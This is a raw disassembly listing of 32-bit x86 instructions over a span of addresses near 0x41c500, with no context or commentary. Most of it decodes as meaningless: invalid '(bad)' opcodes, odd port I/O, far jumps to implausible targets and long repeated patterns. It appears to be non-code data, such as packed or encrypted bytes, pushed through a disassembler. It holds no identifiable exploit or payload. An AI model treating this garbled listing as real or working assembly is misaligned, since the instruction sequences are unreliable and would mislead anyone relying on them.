  41c48f:	sbb    eax,0x89ccd4a7
  41c494:	sti    
  41c495:	out    dx,eax
  41c496:	ja     0x41c4db
	...
  41c4c0:	add    BYTE PTR [eax],al
  41c4c2:	mov    ?,edx
  41c4c4:	inc    ebp
  41c4c5:	cld    
  41c4c6:	mov    bh,0x5e
  41c4c8:	aam    0x89
  41c4ca:	jecxz  0x41c526
  41c4cc:	pop    ebx
  41c4cd:	js     0x41c4cc
  41c4cf:	xor    BYTE PTR [eax+0x46],0x6a
  41c4d3:	jecxz  0x41c489
  41c4d5:	fcmovnbe st,st(6)
  41c4d7:	not    bl
  41c4d9:	inc    edx
  41c4da:	ds loopne 0x41c489
  41c4dd:	retf   
  41c4de:	out    dx,al
  41c4df:	add    BYTE PTR [eax-0x35],0x53
  41c4e3:	ins    DWORD PTR es:[edi],dx
  41c4e4:	mov    edi,0xe71bcd67
  41c4e9:	jle    0x41c4e8
  41c4eb:	push   0xffffffb7
  41c4ed:	(bad)  [edi]
  41c4ef:	je     0x41c50f
  41c4f1:	int3   
  41c4f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4f3:	neg    DWORD PTR [ebx-0x5b21c1be]
  41c4f9:	fisttp DWORD PTR [esi+0x1bcb2483]
  41c4ff:	ins    DWORD PTR es:[edi],dx
  41c500:	xchg   ebp,eax
  41c501:	jle    0x41c580
  41c503:	jae    0x41c49c
  41c505:	fcmovnb st,st(2)
  41c507:	jae    0x41c4f7
  41c509:	retf   
  41c50a:	mov    ch,0x15
  41c50c:	out    dx,eax
  41c50d:	xor    eax,ebp
  41c50f:	push   ss
  41c510:	xlat   BYTE PTR ds:[ebx]
  41c511:	xor    al,0xe6
  41c513:	in     al,0xce
  41c515:	retf   
  41c516:	jmp    0x41c4f0
  41c518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c519:	hlt    
  41c51a:	mov    ebx,esi
  41c51c:	sub    al,0xdc
  41c51e:	outs   dx,BYTE PTR ds:[esi]
  41c51f:	adc    DWORD PTR [ecx-0x34],0xffffffd3
  41c523:	ins    BYTE PTR es:[edi],dx
  41c524:	adc    eax,0x2f
	...
  41c54d:	add    BYTE PTR [eax],al
  41c54f:	add    cl,al
  41c551:	jg     0x41c55f
  41c553:	(bad)  
  41c554:	ss pop ebx
  41c556:	cmp    al,0x7d
  41c558:	popf   
  41c559:	fimul  DWORD PTR [ebx-0x18934e88]
  41c55f:	adc    BYTE PTR ss:[edx+eiz*2],al
  41c563:	sub    DWORD PTR [esi],esi
  41c565:	loopne 0x41c563
  41c567:	test   esp,0x93ca67d6
  41c56d:	ins    BYTE PTR es:[edi],dx
  41c56e:	add    BYTE PTR [ecx],bl
  41c570:	push   0x7
  41c572:	(bad)  
  41c573:	outs   dx,BYTE PTR ds:[esi]
  41c574:	jne    0x41c577
  41c576:	add    cl,dl
  41c578:	cdq    
  41c579:	call   0x74d7aebc
  41c57e:	sti    
  41c57f:	push   esi
  41c580:	jne    0x41c5be
  41c582:	shl    BYTE PTR [ebx-0x48],cl
  41c585:	ja     0x41c5fa
  41c587:	test   al,0x3d
  41c589:	jecxz  0x41c58f
  41c58b:	sti    
  41c58c:	sti    
  41c58d:	fsqrt  
  41c58f:	rol    DWORD PTR [ecx],1
  41c591:	jl     0x41c558
  41c593:	fs repnz ins BYTE PTR es:[edi],dx
  41c596:	std    
  41c597:	es inc ebx
  41c599:	pop    ebx
  41c59a:	add    cl,ch
  41c59c:	adc    BYTE PTR [edi],al
  41c59e:	xchg   DWORD PTR [ecx],ebx
  41c5a0:	stos   DWORD PTR es:[edi],eax
  41c5a1:	fdiv   DWORD PTR [edi+ecx*1-0xb]
  41c5a5:	ins    DWORD PTR es:[edi],dx
  41c5a6:	das    
  41c5a7:	sbb    edi,ecx
  41c5a9:	sub    cl,BYTE PTR [ecx-0x292919c]
  41c5af:	test   BYTE PTR [edx+0xef7cd8],0x0
	...
  41c5de:	hlt    
  41c5df:	ins    DWORD PTR es:[edi],dx
  41c5e0:	std    
  41c5e1:	ins    BYTE PTR es:[edi],dx
  41c5e2:	mov    DWORD PTR [ebp-0x3],ebp
  41c5e5:	fidiv  WORD PTR [eax-0x20]
  41c5e8:	jl     0x41c5c1
  41c5ea:	hlt    
  41c5eb:	ins    DWORD PTR es:[edi],dx
  41c5ec:	or     eax,0xe0da388f
  41c5f1:	inc    esi
  41c5f2:	pop    ecx
  41c5f3:	mov    al,0x7c
  41c5f5:	mov    edi,0x7f0d6e04
  41c5fa:	xor    al,0x3c
  41c5fc:	clc    
  41c5fd:	popa   
  41c5fe:	cmp    dl,BYTE PTR [ebp+0x1900e901]
  41c604:	and    DWORD PTR [ebx+0x6902f0a5],0xa7735b38
  41c60e:	outs   dx,DWORD PTR ds:[esi]
  41c60f:	add    eax,0xa14700e8
  41c614:	sti    
  41c615:	jmp    DWORD PTR [ebx+edi*4]
  41c618:	js     0x41c618
  41c61a:	adc    BYTE PTR [ecx+0x57cc8000],ah
  41c620:	jno    0x41c5c9
  41c622:	in     al,0xe2
  41c624:	js     0x41c624
  41c626:	adc    BYTE PTR [ecx-0xd0e8b00],ah
  41c62c:	add    BYTE PTR [eax+0x50fba0f1],0xef
  41c633:	mov    eax,ds:0x4110fff9
  41c638:	pop    esi
  41c639:	pop    ebx
  41c63a:	fiadd  WORD PTR [ebx+0x575fc259]
  41c640:	push   ecx
  41c641:	mov    DWORD PTR [eax],eax
	...
  41c66b:	add    BYTE PTR [edx+0x2e],cl
  41c66e:	push   eax
  41c66f:	push   ebx
  41c670:	jmp    0x9c4a175e
  41c675:	xor    ecx,DWORD PTR [ebx+ecx*4]
  41c678:	retf   0x2e6e
  41c67b:	leave  
  41c67c:	lea    ebp,[edx+0xe]
  41c67f:	mov    bl,bl
  41c681:	arpl   bp,si
  41c683:	mov    bl,BYTE PTR [ebx]
  41c685:	jo     0x41c60c
  41c687:	add    al,0xee
  41c689:	pop    ds
  41c68a:	jg     0x41c685
  41c68c:	out    dx,eax
  41c68d:	and    ch,cl
  41c68f:	push   ebx
  41c690:	xor    eax,0x10faac87
  41c695:	xchg   ebp,eax
  41c696:	sub    eax,0x176382d2
  41c69b:	mov    ch,bl
  41c69d:	push   eax
  41c69e:	xor    al,BYTE PTR [ecx]
  41c6a0:	dec    edi
  41c6a1:	pop    esi
  41c6a2:	inc    edx
  41c6a3:	or     DWORD PTR [ebp-0x390f8699],0xffffffb0
  41c6aa:	mov    al,BYTE PTR [edx+edi*4-0x6a]
  41c6ae:	mov    BYTE PTR [edx*4+0x3efa7f20],al
  41c6b5:	jl     0x41c6fc
  41c6b7:	icebp  
  41c6b8:	add    BYTE PTR ds:0xb5fbec79,ch
  41c6be:	clc    
  41c6bf:	call   DWORD PTR [ecx+0x3e000174]
  41c6c5:	je     0x41c6c8
  41c6c7:	add    BYTE PTR [esi],bh
  41c6c9:	je     0x41c6cc
  41c6cb:	add    BYTE PTR [esi],bh
  41c6cd:	je     0x41c6d0
	...
  41c6f7:	add    BYTE PTR [eax],al
  41c6f9:	add    BYTE PTR [esi],bh
  41c6fb:	je     0x41c6fe
  41c6fd:	add    BYTE PTR [esi],bh
  41c6ff:	je     0x41c702
  41c701:	add    BYTE PTR [esi],bh
  41c703:	je     0x41c706
  41c705:	add    BYTE PTR [esi],bh
  41c707:	je     0x41c70a
  41c709:	add    BYTE PTR [esi],bh
  41c70b:	je     0x41c70e
  41c70d:	add    BYTE PTR [esi],bh
  41c70f:	je     0x41c712
  41c711:	add    BYTE PTR [esi],bh
  41c713:	je     0x41c716
  41c715:	add    BYTE PTR [esi],bh
  41c717:	je     0x41c71a
  41c719:	add    BYTE PTR [esi],bh
  41c71b:	je     0x41c71e
  41c71d:	add    BYTE PTR [esi],bh
  41c71f:	je     0x41c722
  41c721:	add    BYTE PTR [esi],bh
  41c723:	je     0x41c726
  41c725:	add    BYTE PTR [esi],bh
  41c727:	je     0x41c72a
  41c729:	add    BYTE PTR [esi],bh
  41c72b:	je     0x41c72e
  41c72d:	add    BYTE PTR [esi],bh
  41c72f:	je     0x41c732
  41c731:	add    BYTE PTR [esi],bh
  41c733:	je     0x41c736
  41c735:	add    BYTE PTR [esi],bh
  41c737:	je     0x41c73a
  41c739:	add    BYTE PTR [esi],bh
  41c73b:	je     0x41c73e
  41c73d:	add    BYTE PTR [esi],bh
  41c73f:	je     0x41c742
  41c741:	add    BYTE PTR [esi],bh
  41c743:	je     0x41c746
  41c745:	add    BYTE PTR [esi],bh
  41c747:	je     0x41c74a
  41c749:	add    BYTE PTR [esi],bh
  41c74b:	je     0x41c74e
  41c74d:	add    BYTE PTR [esi],bh
  41c74f:	je     0x41c752
  41c751:	add    BYTE PTR [esi],bh
  41c753:	je     0x41c756
  41c755:	add    BYTE PTR [esi],bh
  41c757:	pop    ebx
  41c758:	out    0x3,eax
  41c75a:	ds pop ebx
  41c75c:	out    0x3,eax
	...
  41c786:	add    BYTE PTR [eax],al
  41c788:	ds pop ebx
  41c78a:	out    0x3,eax
  41c78c:	ds pop ebx
  41c78e:	out    0x3,eax
  41c790:	ds pop ebx
  41c792:	out    0x3,eax
  41c794:	ds pop ebx
  41c796:	out    0x3,eax
  41c798:	ds pop ebx
  41c79a:	out    0x3,eax
  41c79c:	ds pop ebx
  41c79e:	out    0x3,eax
  41c7a0:	ds pop ebx
  41c7a2:	out    0x3,eax
  41c7a4:	ds pop ebx
  41c7a6:	out    0x3,eax
  41c7a8:	ds pop ebx
  41c7aa:	out    0x3,eax
  41c7ac:	ds pop ebx
  41c7ae:	out    0x3,eax
  41c7b0:	ds pop ebx
  41c7b2:	out    0x3,eax
  41c7b4:	ds pop ebx
  41c7b6:	out    0x3,eax
  41c7b8:	ds pop ebx
  41c7ba:	out    0x3,eax
  41c7bc:	ds pop ebx
  41c7be:	out    0x3,eax
  41c7c0:	ds pop ebx
  41c7c2:	out    0x3,eax
  41c7c4:	ds pop ebx
  41c7c6:	out    0x3,eax
  41c7c8:	ds pop ebx
  41c7ca:	in     al,0xfd
  41c7cc:	xor    al,0x55
  41c7ce:	mov    BYTE PTR [ebx],dh
  41c7d0:	mov    dh,dl
  41c7d2:	mov    BYTE PTR [ebx],ah
  41c7d4:	mov    BYTE PTR [edx],ch
  41c7d6:	int    0x13
  41c7d8:	pop    ecx
  41c7d9:	cmp    eax,edi
  41c7db:	push   ss
  41c7dc:	pop    esi
  41c7dd:	cmp    esi,DWORD PTR [ebx+0x5b]
  41c7e0:	pop    ebp
  41c7e1:	cmp    ebx,DWORD PTR [edx+0x59]
  41c7e4:	xchg   ecx,eax
  41c7e5:	test   DWORD PTR [edx+0x61],0x5c5b3b6c
	...
  41c814:	add    BYTE PTR [eax],al
  41c816:	pop    ebp
  41c817:	cmp    ecx,DWORD PTR [ecx+0x61]
  41c81a:	push   edx
  41c81b:	out    dx,eax
  41c81c:	dec    ebx
  41c81d:	push   edx
  41c81e:	push   ds
  41c81f:	and    eax,0x1c37f910
  41c824:	add    BYTE PTR [esi+0x6a],al
  41c827:	lock jno 0x41c86a
  41c82a:	sbb    ebx,esi
  41c82c:	jae    0x41c7f7
  41c82e:	push   ebp
  41c82f:	cli    
  41c830:	es leave 
  41c832:	push   edx
  41c833:	xor    BYTE PTR [edi],dh
  41c835:	rol    DWORD PTR [esi+0x2d],1
  41c838:	xor    cl,bl
  41c83a:	dec    edx
  41c83b:	cmp    esp,DWORD PTR [edx+0x0]
  41c83e:	pop    edx
  41c83f:	adc    eax,0xfdec046d
  41c844:	bound  eax,QWORD PTR [edi]
  41c846:	pop    edx
  41c847:	and    BYTE PTR [edx-0x6],ah
  41c84a:	fdivp  st(0),st
  41c84c:	sub    ecx,DWORD PTR [ecx]
  41c84e:	sti    
  41c84f:	imul   BYTE PTR [ebx+0x9]
  41c852:	sub    al,0x0
  41c854:	gs shl ecx,0xe9
  41c858:	pop    ds
  41c859:	mov    ebx,0xbb62e9de
  41c85e:	add    edi,esp
  41c860:	arpl   WORD PTR [edi],cx
  41c862:	inc    edi
  41c863:	push   edx
  41c864:	or     esp,ebx
  41c866:	push   es
  41c867:	div    BYTE PTR [ecx-0x3c]
  41c86a:	pop    ebp
  41c86b:	add    BYTE PTR [esi-0x71],ch
  41c86e:	mov    ch,ch
  41c870:	push   0xffffff88
  41c872:	jns    0x41c874
  41c874:	ins    DWORD PTR es:[edi],dx
  41c875:	xchg   DWORD PTR [edi],esi
  41c877:	cmp    ebp,DWORD PTR [eax-0x6b]
	...
  41c8a2:	add    BYTE PTR [eax],al
  41c8a4:	mov    ebx,ebp
  41c8a6:	cmp    esi,edx
  41c8a8:	sub    dh,ch
  41c8aa:	je     0x41c922
  41c8ac:	xor    eax,DWORD PTR [eax]
  41c8ae:	bound  edi,QWORD PTR [edx-0x62]
  41c8b1:	stc    
  41c8b2:	jo     0x41c932
  41c8b4:	fwait
  41c8b5:	out    dx,eax
  41c8b6:	je     0x41c900
  41c8b8:	mov    esp,?
  41c8ba:	sub    eax,0x2cf4914a
  41c8bf:	in     al,0xe7
  41c8c1:	push   esp
  41c8c2:	or     ch,cl
  41c8c4:	cmp    eax,0xe700005b
  41c8c9:	pop    ebx
  41c8ca:	add    BYTE PTR [eax],al
  41c8cc:	xlat   BYTE PTR ds:[ebx]
  41c8cd:	pop    ebx
  41c8ce:	add    BYTE PTR [eax],al
  41c8d0:	xlat   BYTE PTR ds:[ebx]
  41c8d1:	pop    ebx
  41c8d2:	add    BYTE PTR [eax],al
  41c8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d5:	pop    ebx
  41c8d6:	add    BYTE PTR [eax],al
  41c8d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d9:	pop    ebx
  41c8da:	add    BYTE PTR [eax],al
  41c8dc:	xchg   edi,eax
  41c8dd:	pop    ebx
  41c8de:	add    BYTE PTR [eax],al
  41c8e0:	xchg   edi,eax
  41c8e1:	pop    ebx
  41c8e2:	add    BYTE PTR [eax],al
  41c8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e5:	pop    ebx
  41c8e6:	add    BYTE PTR [eax],al
  41c8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e9:	pop    ebx
  41c8ea:	add    BYTE PTR [eax],al
  41c8ec:	xchg   edi,eax
  41c8ed:	pop    ebx
  41c8ee:	add    BYTE PTR [eax],al
  41c8f0:	xchg   edi,eax
  41c8f1:	pop    ebx
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	addr16 pop ebx
  41c8f6:	add    BYTE PTR [eax],al
  41c8f8:	addr16 pop ebx
  41c8fa:	add    BYTE PTR [eax],al
  41c8fc:	push   edi
  41c8fd:	pop    ebx
  41c8fe:	add    BYTE PTR [eax],al
  41c900:	retf   0x4ed8
  41c903:	imul   esp,DWORD PTR [esi],0x3b
  41c906:	sub    DWORD PTR [eax+eax*1],eax
	...
  41c931:	add    BYTE PTR [ecx],dl
  41c933:	mov    dh,0x54
  41c935:	in     al,dx
  41c936:	sub    bh,BYTE PTR [edx-0x2587d29e]
  41c93c:	pop    es
  41c93d:	push   edi
  41c93e:	cmp    ah,BYTE PTR [ebp+0x5]
  41c941:	adc    ebx,esp
  41c943:	ins    DWORD PTR es:[edi],dx
  41c944:	gs in  al,0xef
  41c947:	adc    al,0x4f
  41c949:	mov    ss,WORD PTR [edi]
  41c94b:	pop    ebx
  41c94c:	add    BYTE PTR [eax],al
  41c94e:	daa    
  41c94f:	pop    ebx
  41c950:	add    BYTE PTR [eax],al
  41c952:	daa    
  41c953:	pop    ebx
  41c954:	add    BYTE PTR [eax],al
  41c956:	pop    ss
  41c957:	pop    ebx
  41c958:	add    BYTE PTR [eax],al
  41c95a:	pop    ss
  41c95b:	pop    ebx
  41c95c:	add    BYTE PTR [eax],al
  41c95e:	out    0x5a,eax
  41c960:	add    BYTE PTR [eax],al
  41c962:	out    0x5a,eax
  41c964:	add    BYTE PTR [eax],al
  41c966:	xlat   BYTE PTR ds:[ebx]
  41c967:	pop    edx
  41c968:	add    BYTE PTR [eax],al
  41c96a:	ds je  0x41c96e
  41c96d:	add    BYTE PTR [esi],bh
  41c96f:	je     0x41c972
  41c971:	add    BYTE PTR [esi],bh
  41c973:	je     0x41c976
  41c975:	add    BYTE PTR [esi],bh
  41c977:	je     0x41c97a
  41c979:	add    BYTE PTR [esi],bh
  41c97b:	je     0x41c97e
  41c97d:	add    BYTE PTR [esi],bh
  41c97f:	je     0x41c982
  41c981:	add    BYTE PTR [esi],bh
  41c983:	je     0x41c986
  41c985:	add    BYTE PTR [esi],bh
  41c987:	je     0x41c98a
  41c989:	add    BYTE PTR [esi],bh
  41c98b:	je     0x41c98e
  41c98d:	add    BYTE PTR [esi],bh
  41c98f:	je     0x41c992
  41c991:	add    BYTE PTR [esi],bh
  41c993:	je     0x41c996
	...
  41c9bd:	add    BYTE PTR [eax],al
  41c9bf:	add    BYTE PTR [esi],bh
  41c9c1:	je     0x41c9c4
  41c9c3:	add    BYTE PTR [esi],bh
  41c9c5:	je     0x41c9c8
  41c9c7:	add    BYTE PTR [esi],bh
  41c9c9:	je     0x41c9cc
  41c9cb:	add    BYTE PTR [esi],bh
  41c9cd:	je     0x41c9d0
  41c9cf:	add    BYTE PTR [esi],bh
  41c9d1:	je     0x41c9d4
  41c9d3:	add    BYTE PTR [esi],bh
  41c9d5:	je     0x41c9d8
  41c9d7:	add    BYTE PTR [esi],bh
  41c9d9:	je     0x41c9dc
  41c9db:	add    BYTE PTR [esi],bh
  41c9dd:	je     0x41c9e0
  41c9df:	add    BYTE PTR [esi],bh
  41c9e1:	je     0x41c9e4
  41c9e3:	add    BYTE PTR [esi],bh
  41c9e5:	je     0x41c9e8
  41c9e7:	add    BYTE PTR [esi],bh
  41c9e9:	je     0x41c9ec
  41c9eb:	add    BYTE PTR [esi],bh
  41c9ed:	je     0x41c9f0
  41c9ef:	add    BYTE PTR [esi],bh
  41c9f1:	je     0x41c9f4
  41c9f3:	add    BYTE PTR [esi],bh
  41c9f5:	je     0x41c9f8
  41c9f7:	add    BYTE PTR [esi],bh
  41c9f9:	je     0x41c9fc
  41c9fb:	add    BYTE PTR [esi],bh
  41c9fd:	je     0x41ca00
  41c9ff:	add    BYTE PTR [esi],bh
  41ca01:	je     0x41ca04
  41ca03:	add    BYTE PTR [esi],bh
  41ca05:	je     0x41ca08
  41ca07:	add    BYTE PTR [esi],bh
  41ca09:	je     0x41ca0c
  41ca0b:	add    BYTE PTR [esi],bh
  41ca0d:	pop    ebx
  41ca0e:	out    0x3,eax
  41ca10:	ds pop ebx
  41ca12:	out    0x3,eax
  41ca14:	ds pop ebx
  41ca16:	out    0x3,eax
  41ca18:	ds pop ebx
  41ca1a:	out    0x3,eax
  41ca1c:	ds pop ebx
  41ca1e:	out    0x3,eax
  41ca20:	ds pop ebx
  41ca22:	out    0x3,eax
	...
  41ca4c:	add    BYTE PTR [eax],al
  41ca4e:	ds pop ebx
  41ca50:	out    0x3,eax
  41ca52:	ds pop ebx
  41ca54:	out    0x3,eax
  41ca56:	ds pop ebx
  41ca58:	out    0x3,eax
  41ca5a:	ds pop ebx
  41ca5c:	out    0x3,eax
  41ca5e:	ds pop ebx
  41ca60:	out    0x3,eax
  41ca62:	ds pop ebx
  41ca64:	out    0x3,eax
  41ca66:	ds pop ebx
  41ca68:	out    0x3,eax
  41ca6a:	ds pop ebx
  41ca6c:	out    0x3,eax
  41ca6e:	ds pop ebx
  41ca70:	out    0x3,eax
  41ca72:	ds pop ebx
  41ca74:	out    0x3,eax
  41ca76:	ds pop ebx
  41ca78:	out    0x3,eax
  41ca7a:	ds pop ebx
  41ca7c:	out    0x3,eax
  41ca7e:	ds pop ebx
  41ca80:	out    0x3,eax
  41ca82:	ds pop ebx
  41ca84:	out    0x3,eax
  41ca86:	ds pop ebx
  41ca88:	out    0x3,eax
  41ca8a:	ds pop ebx
  41ca8c:	out    0x3,eax
  41ca8e:	ds pop ebx
  41ca90:	out    0x3,eax
  41ca92:	ds pop ebx
  41ca94:	out    0x3,eax
  41ca96:	ds pop ebx
  41ca98:	out    0x3,eax
  41ca9a:	ds pop ebx
  41ca9c:	out    0x3,eax
  41ca9e:	ds pop ebx
  41caa0:	fcom   DWORD PTR [ecx]
  41caa2:	dec    edi
  41caa3:	das    
  41caa4:	aam    0xd
  41caa6:	ds jmp 0x41ca30
  41caa9:	push   eax
  41caaa:	(bad)  
  41caab:	in     al,dx
  41caac:	lea    edx,[ecx-0x66]
  41caaf:	pop    ebx
  41cab0:	add    BYTE PTR [ecx+0x0],bh
	...
  41cadb:	add    BYTE PTR [ebp+0x3d8b61eb],dl
  41cae1:	hlt    
  41cae2:	je     0x41cb30
  41cae4:	xor    bh,ch
  41cae6:	jbe    0x41cad1
  41cae8:	jmp    0x6764:0xd71d312a
  41caef:	inc    esp
  41caf0:	or     eax,ebp
  41caf2:	jo     0x41cadd
  41caf4:	shr    BYTE PTR [edx],cl
  41caf6:	xor    ebp,esi
  41caf8:	(bad)  
  41caf9:	cs xor eax,0x32343df1
  41caff:	cli    
  41cb00:	test   eax,0x610b6064
  41cb05:	xor    al,0x32
  41cb07:	fidivr DWORD PTR ds:0x4f1d62f7
  41cb0d:	clc    
  41cb0e:	data16 (bad) 
  41cb10:	cmp    eax,0x51fa62ef
  41cb15:	pop    ebx
  41cb16:	ins    BYTE PTR es:[edi],dx
  41cb17:	push   cs
  41cb18:	inc    esp
  41cb19:	clc    
  41cb1a:	push   DWORD PTR [edi-0x6ffd48d]
  41cb20:	sbb    ch,dl
  41cb22:	jo     0x41cb02
  41cb24:	sub    al,0xe9
  41cb26:	arpl   WORD PTR [eax],bx
  41cb28:	cmp    dh,bl
  41cb2a:	(bad)  
  41cb2b:	lds    ebp,FWORD PTR [ecx]
  41cb2d:	idiv   bh
  41cb2f:	mov    ebx,0xcc68f50c
  41cb34:	or     bl,BYTE PTR [ebx+0x64]
  41cb37:	mov    ebx,0xc76cfe1a
  41cb3c:	cmp    eax,0xb471ef
	...
  41cb69:	add    BYTE PTR [eax-0x11],ch
  41cb6c:	ins    DWORD PTR es:[edi],dx
  41cb6d:	xchg   esi,eax
  41cb6e:	xor    ah,BYTE PTR [eax+esi*1-0x28]
  41cb72:	sub    dh,BYTE PTR ds:0xfc3dd82f
  41cb78:	imul   edi,DWORD PTR [esi+0x57],0xfffffff8
  41cb7c:	jbe    0x41cb7e
  41cb7e:	mov    al,0x22
  41cb80:	add    BYTE PTR [ecx],dh
  41cb82:	lds    ebp,FWORD PTR [ecx+esi*1+0x35]
  41cb86:	mov    ecx,0xbf72fd60
  41cb8b:	ds outs dx,DWORD PTR fs:[esi]
  41cb8e:	mov    BYTE PTR [edi+0x2d],bl
  41cb91:	xor    al,BYTE PTR [ebx+eiz*2+0x32]
  41cb95:	cmp    BYTE PTR ss:[edi+0x36],ah
  41cb99:	add    BYTE PTR [edi+esi*1+0x23046972],al
  41cba0:	add    BYTE PTR [ebx+0xa],dh
  41cba3:	sub    DWORD PTR [edi+0x68],ebp
  41cba6:	(bad)  
  41cba7:	sub    BYTE PTR [ecx+0x0],ah
  41cbaa:	jb     0x41cbea
  41cbac:	outs   dx,DWORD PTR ds:[esi]
  41cbad:	je     0x41cbe9
  41cbaf:	sub    eax,0x2a306300
  41cbb4:	jo     0x41cc2b
  41cbb6:	cmp    esi,DWORD PTR [edx]
  41cbb8:	jb     0x41cbba
  41cbba:	aaa    
  41cbbb:	sub    eax,0x32346e65
  41cbc0:	outs   dx,DWORD PTR ds:[esi]
  41cbc1:	jae    0x41cb5a
  41cbc3:	sub    esp,DWORD PTR [ebp+0x67]
  41cbc6:	dec    eax
  41cbc7:	xor    dh,BYTE PTR [edx+0x0]
  41cbca:	cmp    DWORD PTR [eax],ebp
  41cbcc:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x0
	...
  41cbf5:	add    BYTE PTR [eax],al
  41cbf7:	add    BYTE PTR [ebp+0x3e],dh
  41cbfa:	ins    BYTE PTR es:[edi],dx
  41cbfb:	ins    BYTE PTR es:[edi],dx
  41cbfc:	push   edi
  41cbfd:	outs   dx,BYTE PTR ds:[esi]
  41cbff:	mov    dh,BYTE PTR [bp+di]
  41cc02:	add    BYTE PTR [edx+0x7a],ch
  41cc05:	sub    al,0x71
  41cc07:	jae    0x41cc4f
  41cc09:	push   edi
  41cc0a:	sub    eax,0x2f6e4432
  41cc0f:	xor    esp,DWORD PTR [edi]
  41cc11:	es push 0x7633eb61
  41cc17:	lds    ebx,FWORD PTR gs:[esi+0x66]
  41cc1b:	jb     0x41cbd7
  41cc1d:	xor    esp,DWORD PTR [edi+ebp*2+0x3e]
  41cc21:	xlat   BYTE PTR ds:[ebx]
  41cc22:	add    DWORD PTR [ecx-0x59],ebp
  41cc25:	loopne 0x41cc53
  41cc27:	arpl   WORD PTR [esp+esi*2-0x25658edc],cx
  41cc2e:	add    DWORD PTR [ecx+0x69],esi
  41cc31:	aad    0x26
  41cc33:	arpl   WORD PTR [esp+esi*2+0x36],bp
  41cc37:	jae    0x41cca7
  41cc39:	(bad)  
  41cc3b:	imul   ebx,DWORD PTR [edi+0x12],0x4
  41cc3f:	imul   esp,DWORD PTR [edi+0x15],0x2c
  41cc43:	pop    edi
  41cc44:	pop    ebx
  41cc45:	and    BYTE PTR [ecx+eiz*2],al
  41cc48:	push   esi
  41cc49:	(bad)  
  41cc4b:	jno    0x41cca8
  41cc4d:	je     0x41cc79
  41cc4f:	outs   dx,BYTE PTR ds:[esi]
  41cc50:	xor    cl,BYTE PTR [edi]
  41cc52:	outs   dx,BYTE PTR ss:[esi]
  41cc54:	sbb    ebp,DWORD PTR [eax]
  41cc56:	add    al,0x6a
  41cc58:	sbb    DWORD PTR [ebp+0x2c],eax
  41cc5b:	jae    0x41cc5d
	...
  41cc85:	add    BYTE PTR [edi],bl
  41cc87:	je     0x41ccb0
  41cc89:	jae    0x41cca8
  41cc8b:	pop    ebp
  41cc8c:	cmp    DWORD PTR [ebp+0xb],ebp
  41cc8f:	je     0x41ccb4
  41cc91:	ins    BYTE PTR es:[edi],dx
  41cc92:	and    esp,DWORD PTR [ebp+0x34]
  41cc95:	arpl   WORD PTR [edx],bx
  41cc97:	je     0x41ccbc
  41cc99:	pop    edi
  41cc9a:	in     eax,dx
  41cc9b:	dec    esi
  41cc9c:	es pop edi
  41cc9e:	loop   0x41ccff
  41cca0:	add    DWORD PTR [ecx-0xe],esi
  41cca3:	xchg   edx,eax
  41cca4:	xor    esi,DWORD PTR [ebp-0x21]
  41cca7:	test   DWORD PTR [eax+eax*1],esi
  41ccaa:	push   cs
  41ccab:	inc    esp
  41ccac:	hlt    
  41ccad:	das    
  41ccae:	push   cs
  41ccaf:	inc    esp
  41ccb0:	add    al,0x70
  41ccb2:	shl    DWORD PTR [ebp+0x73db6c31],cl
  41ccb8:	sub    ebp,DWORD PTR [ebp-0x54]
  41ccbb:	nop
  41ccbc:	and    ch,BYTE PTR [esi+0x3e]
  41ccbf:	call   0x38f:0x5bb26722
  41ccc6:	scas   eax,DWORD PTR es:[edi]
  41ccc7:	call   0xeddefb57
  41cccc:	out    0x22,al
  41ccce:	(bad)  
  41cccf:	repz jp 0x41ccf8
  41ccd2:	xchg   ecx,eax
  41ccd3:	pop    ebx
  41ccd4:	mov    DWORD PTR [esi],esi
  41ccd6:	(bad)  
  41ccd7:	out    0x83,eax
  41ccd9:	xor    eax,0x228bf33e
  41ccde:	push   0x6e037cf8
  41cce3:	clc    
  41cce4:	push   esi
  41cce5:	xor    al,0x5d
  41cce7:	in     eax,dx
  41cce8:	out    0xf8,al
	...
  41cd12:	add    BYTE PTR [eax],al
  41cd14:	adc    ch,BYTE PTR [edx]
  41cd16:	push   ds
  41cd17:	stc    
  41cd18:	or     ch,BYTE PTR [edx]
  41cd1a:	out    0x2b,eax
  41cd1c:	dec    ebp
  41cd1d:	icebp  
  41cd1e:	cmp    ah,BYTE PTR [edi]
  41cd20:	dec    esp
  41cd21:	pop    ebx
  41cd22:	dec    ebx
  41cd23:	xor    DWORD PTR [eax],esi
  41cd25:	clc    
  41cd26:	inc    edx
  41cd27:	cmp    edi,DWORD PTR [esi]
  41cd29:	cld    
  41cd2a:	cmp    al,0x28
  41cd2c:	sub    al,0xf8
  41cd2e:	sbb    eax,0xdf32a04
  41cd33:	das    
  41cd34:	stc    
  41cd35:	in     eax,dx
  41cd36:	out    0x22,al
  41cd38:	and    dl,bh
  41cd3a:	add    esi,DWORD PTR [eax]
  41cd3c:	cvtdq2ps xmm1,XMMWORD PTR [edx]
  41cd3f:	sub    al,0xe1
  41cd41:	in     al,dx
  41cd42:	or     ch,BYTE PTR [ebx]
  41cd44:	fstp   QWORD PTR [edx+0xb]
  41cd47:	and    esp,eax
  41cd49:	repz add esi,DWORD PTR [eax]
  41cd4c:	ds sub al,0x18
  41cd4f:	repz adc BYTE PTR [ebx-0x2f],bl
  41cd53:	es call 0xdd6b8d49
  41cd59:	in     al,dx
  41cd5a:	out    0x34,al
  41cd5c:	loope  0x41cd4e
  41cd5e:	int    0x2f
  41cd60:	fstp   QWORD PTR [edx-0x31]
  41cd63:	and    ch,BYTE PTR [eax+0x65c7fff1]
  41cd69:	pop    ebx
  41cd6a:	outs   dx,DWORD PTR ds:[esi]
  41cd6b:	enter  0xe66b,0x70
  41cd6f:	mov    eax,ds:0x995ef33d
  41cd74:	dec    ebp
  41cd75:	call   0x425179
	...
  41cda2:	pop    esp
  41cda3:	out    0x71,eax
  41cda5:	add    BYTE PTR [ebp+0x5b],0x70
  41cda9:	mov    BYTE PTR [edx-0x16],cl
  41cdac:	inc    DWORD PTR [edi-0x77a0ffe4]
